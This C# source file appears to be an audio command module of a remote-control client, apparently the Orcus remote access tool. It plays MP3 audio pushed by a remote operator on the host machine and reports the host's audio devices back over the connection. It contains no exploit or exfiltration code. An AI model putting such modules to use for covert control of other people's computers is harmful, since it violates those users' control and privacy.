using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;
using CSCore;
using CSCore.Codecs.MP3;
using CSCore.CoreAudioAPI;
using CSCore.DirectSound;
using CSCore.SoundOut;
using Orcus.Plugins;
using Orcus.Shared.Commands.Audio;
using Orcus.Shared.NetSerializer;
using Orcus.Utilities;

namespace Orcus.Commands.Audio
{
    internal class AudioCommand : Command
    {
        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((AudioCommunication) parameter[0])
            {
                case AudioCommunication.PlayAudio:
                    if (CoreHelper.RunningOnXP)
                    {
                        connectionInfo.CommandResponse(this,
                            new[] {(byte) AudioCommunication.ResponseNotSupported});
                        return;
                    }

                    var serializer = new Serializer(typeof (PlayAudioInformation));
                    var playInformation = serializer.Deserialize<PlayAudioInformation>(parameter, 1);

                    ISoundOut soundOut;

                    if (WasapiOut.IsSupportedOnCurrentPlatform)
                    {
                        using (var deviceEnumerator = new MMDeviceEnumerator())
                        {
                            var device =
                                deviceEnumerator.EnumAudioEndpoints(DataFlow.Render, DeviceState.Active)
                                    .FirstOrDefault(x => x.DeviceID == playInformation.SoundOutId);
                            if (device == null)
                                return;

                            soundOut = new WasapiOut {Device = device};
                        }
                    }
                    else
                    {
                        var devices = DirectSoundDeviceEnumerator.EnumerateDevices();
                        var guid = new Guid(playInformation.SoundOutId);
                        var device = devices.FirstOrDefault(x => x.Guid == guid);
                        if (device == null)
                            return;

                        soundOut = new DirectSoundOut {Device = guid};
                    }

                    var memoryStream =
                        new MemoryStream(playInformation.AudioData);
                    IWaveSource waveSource = new DmoMp3Decoder(memoryStream);
                    soundOut.Initialize(waveSource);
                    soundOut.Volume = playInformation.Volume;
                    soundOut.Play();

                    soundOut.Stopped += (sender, args) =>
                    {
                        new Thread(() =>
                        {
                            soundOut.Dispose();
                            waveSource.Dispose();
                            memoryStream.Dispose();
                        }).Start();
                    };

                    connectionInfo.CommandResponse(this, new[] {(byte) AudioCommunication.ResponseAudioIsPlaying});
                    break;
                case AudioCommunication.GetDevices:
                    List<SoundOutDevice> result;
                    if (WasapiOut.IsSupportedOnCurrentPlatform)
                    {
                        using (var deviceEnumerator = new MMDeviceEnumerator())
                        {
                            var defaultDevice = deviceEnumerator.GetDefaultAudioEndpoint(DataFlow.Render,
                                Role.Multimedia);

                            result =
                                new List<SoundOutDevice>(
                                    deviceEnumerator.EnumAudioEndpoints(DataFlow.Render, DeviceState.Active)
                                        .Select(enumAudioEndpoint => new SoundOutDevice
                                        {
                                            Id = enumAudioEndpoint.DeviceID,
                                            IsDefault = enumAudioEndpoint.DeviceID == defaultDevice.DeviceID,
                                            Name = enumAudioEndpoint.FriendlyName
                                        }));
                        }
                    }
                    else
                    {
                        var devices = DirectSoundDeviceEnumerator.EnumerateDevices();
                        result =
                            devices.Select(
                                x =>
                                    new SoundOutDevice
                                    {
                                        Id = x.Guid.ToString("N"),
                                        Name = x.Description,
                                        IsDefault = false
                                    }).ToList();
                    }

                    var package = new List<byte> {(byte) AudioCommunication.ResponseDevices};
                    package.AddRange(Encoding.UTF8.GetBytes(new JavaScriptSerializer().Serialize(result)));
                    connectionInfo.CommandResponse(this, package.ToArray());
                    break;
                default:
                    throw new ArgumentOutOfRangeException(nameof(parameter), parameter, null);
            }
        }

        protected override uint GetId()
        {
            return 1;
        }
    }
}